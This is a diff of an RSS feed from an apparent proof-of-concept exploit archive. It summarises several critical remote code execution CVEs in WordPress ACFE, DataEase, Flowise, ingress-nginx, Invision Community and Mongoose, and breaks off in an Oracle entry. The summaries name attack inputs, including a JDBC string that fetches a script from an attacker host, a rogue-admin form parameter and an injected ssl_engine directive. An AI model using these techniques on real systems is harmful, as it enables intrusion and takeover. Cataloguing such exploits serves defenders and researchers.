@@ -1,4 +1,854 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Cwe-94 on PoC Archive</title><link>https://poc.intelseclab.com/tags/cwe-94/</link><description>Recent content in Cwe-94 on PoC Archive</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Sun, 05 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://poc.intelseclab.com/tags/cwe-94/index.xml" rel="self" type="application/rss+xml"/><item><title>Avada Builder Unauthenticated RCE via call_user_func() Allowlist Bypass (CVE-2026-6279)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-05_cve-2026-6279-avada-builder-rce/</link><pubDate>Sun, 05 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-05_cve-2026-6279-avada-builder-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Cwe-94 on PoC Archive</title><link>https://poc.intelseclab.com/tags/cwe-94/</link><description>Recent content in Cwe-94 on PoC Archive</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 06 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://poc.intelseclab.com/tags/cwe-94/index.xml" rel="self" type="application/rss+xml"/><item><title>ACF Extended (ACFE) `prepare_form()` Unauthenticated RCE via Privilege Escalation (CVE-2025-13486)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-13486-acf-extended-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-13486-acf-extended-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>Sélim Lanouar (whattheslime); CVE discovered by Marcin Dudek (dudekmar)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-13486&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>9.8 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>wordpress, acf-extended, acfe, call_user_func_array, unauthenticated-rce, privilege-escalation, admin-account-creation, python, cwe-94&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Advanced Custom Fields: Extended (ACFE) — WordPress plugin&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>0.9.0.5 through 0.9.1.1&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Python 3 (httpx) exploit targeting a PHP/WordPress plugin&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes (target must expose a page containing an ACFE-generated form)&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>The ACF Extended (ACFE) plugin&amp;rsquo;s front-end form-rendering AJAX handler (&lt;code>wp_ajax_nopriv_acfe/form/render_form_ajax&lt;/code>) resolves user-controlled form configuration through &lt;code>prepare_form()&lt;/code>, which ultimately passes attacker-supplied data into &lt;code>call_user_func_array()&lt;/code> without adequate validation. Because the AJAX action is registered as &lt;code>nopriv&lt;/code> (reachable while unauthenticated) and ACFE ships a built-in &lt;code>wp_insert_user&lt;/code> form renderer, an attacker can invoke that renderer directly with &lt;code>form[render]=wp_insert_user&lt;/code> and forged parameters to create a new WordPress account with the &lt;code>administrator&lt;/code> role, then immediately authenticate as that account via the same handler&amp;rsquo;s &lt;code>wp_signon&lt;/code> renderer. The PoC first fingerprints the ACFE version from a static asset URL, then (with &lt;code>--exploit&lt;/code>) creates the rogue admin and logs in, dumping a valid &lt;code>wordpress_logged_in_*&lt;/code> cookie.&lt;/p></description></item><item><title>DataEase PostgreSQL JDBC Datasource-Validation Bypass to Remote Code Execution (CVE-2025-49002)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-49002-dataease-postgresql-jdbc-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-49002-dataease-postgresql-jdbc-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>Feng-Huang-0520&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-49002&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>9.8 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>PoC&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>dataease, jdbc, h2-database, runscript, rce, datasource-validate, ssrf-adjacent, cwe-94, python&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>DataEase (开源数据可视化分析工具 / open-source BI/data-visualization platform by 飞致云/FIT2CLOUD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>Per source repository (DataEase v2 &lt;code>de2api&lt;/code> datasource-validate endpoint)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Python 3 PoC targeting a Java-based DataEase server&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No (uses a fixed/default &lt;code>X-DE-TOKEN&lt;/code> value that does not require valid credentials)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes (HTTP to target DataEase instance, plus outbound HTTP from the target to an attacker-controlled server to fetch the SQL payload)&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>DataEase&amp;rsquo;s &lt;code>/de2api/datasource/validate&lt;/code> endpoint lets a client submit an arbitrary JDBC connection string when testing/validating a new datasource. By choosing datasource &lt;code>type: h2&lt;/code> and supplying a base64-encoded H2 JDBC URL that includes &lt;code>INIT=RUNSCRIPT FROM 'http://attacker/poc.sql'&lt;/code>, an attacker can make the DataEase backend fetch and execute an arbitrary SQL script from a remote URL as part of connection validation. H2&amp;rsquo;s &lt;code>RUNSCRIPT FROM&lt;/code> directive can be abused to execute arbitrary Java code (e.g. via &lt;code>CREATE ALIAS&lt;/code>/&lt;code>CREATE TRIGGER&lt;/code> calling into &lt;code>java.lang.Runtime&lt;/code>), giving full remote code execution on the DataEase server. The PoC simply confirms the injection point is reachable by checking for a specific error code (&lt;code>40001&lt;/code>) in the validation response, which indicates the crafted JDBC URL was accepted and processed.&lt;/p></description></item><item><title>Flowise CustomMCP Unauthenticated Remote Code Execution via Function() Constructor (CVE-2025-59528)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-59528-flowise-custommcp-function-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-59528-flowise-custommcp-function-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>Moon-Harvest&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-59528&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>10.0&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>flowise, rce, custommcp, function-constructor, javascript-injection, unauthenticated, llm, node-load-method, cwe-94&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Flowise (FlowiseAI/Flowise)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>&amp;lt;= 3.0.5 (patched in 3.0.6)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Node.js / TypeScript backend (web application)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No (unauthenticated; only a valid Flowise API key is needed, which may be exposed/default)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes (direct HTTP access to the Flowise API endpoint)&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>Flowise exposes a &lt;code>CustomMCP&lt;/code> node whose &lt;code>loadMethod&lt;/code> handler (&lt;code>/api/v1/node-load-method/customMCP&lt;/code>) accepts a user-supplied &lt;code>mcpServerConfig&lt;/code> string. On the backend, this string is passed straight into a &lt;code>Function()&lt;/code> constructor inside the &lt;code>convertToValidJSONString&lt;/code> helper in order to &amp;ldquo;parse&amp;rdquo; the MCP server configuration. Because &lt;code>Function()&lt;/code> compiles and executes arbitrary JavaScript with the same privileges as the Node.js process, an attacker can smuggle arbitrary JavaScript — including a call into &lt;code>child_process&lt;/code> — through the &lt;code>mcpServerConfig&lt;/code> field. This results in unauthenticated (API-key-gated only) remote code execution on the host running Flowise.&lt;/p></description></item><item><title>IngressNightmare: Kubernetes ingress-nginx Admission Controller Shared-Library Injection RCE (CVE-2025-1974)</title><link>https://poc.intelseclab.com/pocs/cloud/2026-07-06_cve-2025-1974-ingressnightmare-nginx-admission-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/cloud/2026-07-06_cve-2025-1974-ingressnightmare-nginx-admission-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>BoianEduard&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-1974&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>cloud&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>9.8 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>kubernetes, ingress-nginx, ingressnightmare, admission-controller, nginx, ssl-engine, shared-library-injection, cluster-secrets, docker, python, c, cwe-94&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Kubernetes &lt;code>ingress-nginx&lt;/code> admission controller&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>All versions &amp;lt; 1.11.5, 1.11.0-1.11.4, and 1.12.0&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Kubernetes cluster (any provider), C (malicious &lt;code>.so&lt;/code> payload), Python 3 (trigger script)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No (unauthenticated access to the in-cluster admission webhook is sufficient — &amp;ldquo;IngressNightmare&amp;rdquo;)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes (network access to the ingress-nginx controller pod&amp;rsquo;s admission webhook port, typically reachable from within the cluster or via a misconfigured exposure)&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>The ingress-nginx admission controller validates incoming &lt;code>Ingress&lt;/code> objects by rendering a temporary NGINX configuration and running &lt;code>nginx -t&lt;/code> against it — but the validation webhook itself has no authentication and accepts attacker-controlled configuration snippet annotations. By injecting the annotation &lt;code>nginx.ingress.kubernetes.io/configuration-snippet&lt;/code> with content that breaks out of its intended NGINX config context and adds an &lt;code>ssl_engine /path/to/payload.so;&lt;/code> directive, an attacker can make &lt;code>nginx -t&lt;/code> load an arbitrary shared library from a path they control (uploaded beforehand via a separate write primitive to the controller pod, e.g. &lt;code>/tmp/exploit.so&lt;/code>). Because shared libraries execute constructor code as soon as they are mapped into memory, this achieves arbitrary code execution inside the ingress-nginx controller pod — which, under default RBAC, has read access to all Secrets in the cluster, making this a path to full cluster compromise. Publicly disclosed by Wiz Research as &amp;ldquo;IngressNightmare.&amp;rdquo;&lt;/p></description></item><item><title>Invision Community Theme Editor Template Injection Unauthenticated RCE (CVE-2025-47916)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-47916-invision-community-template-injection-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-47916-invision-community-template-injection-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>Egidio Romano (vulnerability discovery); Web3-Serializer (this PoC client)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-47916&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>10.0 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>invision-community, ssti, template-injection, theme-editor, unauthenticated-rce, php, cwe-94, python&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Invision Community, &lt;code>themeeditor&lt;/code> front controller (&lt;code>IPS\core\modules\front\system\themeeditor::customCss()&lt;/code>)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>5.0.0 through 5.0.6 (fixed in 5.0.7)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Python 3 (exploit client); PHP (target, Invision Community)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>Invision Community&amp;rsquo;s theme editor exposes a &lt;code>customCss()&lt;/code> action on the front-end &lt;code>themeeditor&lt;/code> controller (&lt;code>/applications/core/modules/front/system/themeeditor.php&lt;/code>) that is reachable without authentication and passes the attacker-supplied &lt;code>content&lt;/code> request parameter into &lt;code>Theme::makeProcessFunction()&lt;/code>, which processes it as a template expression. Because template expressions can invoke PHP functions, an attacker can craft a &lt;code>content&lt;/code> value that evaluates to arbitrary PHP code execution, resulting in unauthenticated remote code execution against the Invision Community forum/community platform. The included PoC (&lt;code>main.py&lt;/code>) is a small client that base64-encodes a shell command, wraps it in a template expression calling &lt;code>system()&lt;/code>/&lt;code>base64_decode()&lt;/code> wrapped with a &lt;code>die()&lt;/code> and a unique marker string, POSTs it to the vulnerable &lt;code>customCss&lt;/code> action, and extracts the command output from the response — offering single-command execution, a non-intrusive vulnerability test mode, and an interactive pseudo-shell.&lt;/p></description></item><item><title>Mongoose `populate()` Match `$where` Bypass Command Injection (CVE-2025-23061)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-23061-mongoose-command-injection/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-23061-mongoose-command-injection/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>dajneem23&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-23061&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>9.0 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>mongoose, nodejs, nosql-injection, mongodb, populate, where-operator, command-injection, rce, cwe-943, cwe-94, express&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>CVE-2024-53900&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Mongoose (Node.js MongoDB ODM)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>&amp;lt; 6.13.6, &amp;gt;= 7.0.0 &amp;lt; 7.8.4, &amp;gt;= 8.0.0 &amp;lt; 8.9.5&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>JavaScript / Node.js + Express + MongoDB&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>CVE-2025-23061 is an incomplete-fix bypass of CVE-2024-53900, a NoSQL/command injection vulnerability in the Mongoose ODM for Node.js. The original fix blocked &lt;code>$where&lt;/code> operators submitted directly inside a &lt;code>populate()&lt;/code> &lt;code>match&lt;/code> filter, but failed to sanitize &lt;code>$where&lt;/code> when it is nested inside logical operators such as &lt;code>$and&lt;/code> and &lt;code>$or&lt;/code>, allowing attacker-controlled JavaScript to be executed inside MongoDB&amp;rsquo;s (or, via &lt;code>mongo-eval&lt;/code>-style constructor abuse, the Node.js process&amp;rsquo;s) execution context. The included PoC ships an Express + Mongoose server with endpoints that pass unsanitized, user-supplied JSON straight into &lt;code>populate({ match })&lt;/code>, plus an &lt;code>exploit.js&lt;/code> client demonstrating information disclosure, authentication bypass, denial-of-service (infinite loops/sleeps), and remote code execution via &lt;code>this.constructor.constructor(...)&lt;/code> / &lt;code>global.process.mainModule.require(...)&lt;/code> sandbox-escape tricks. Impact ranges from silent data exfiltration to full RCE on the application/database host.&lt;/p></description></item><item><title>Oracle Identity Manager `;.wadl` Authentication Bypass + Groovy Script RCE (CVE-2025-61757)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-61757-oracle-identity-manager-auth-bypass-groovy-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-61757-oracle-identity-manager-auth-bypass-groovy-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
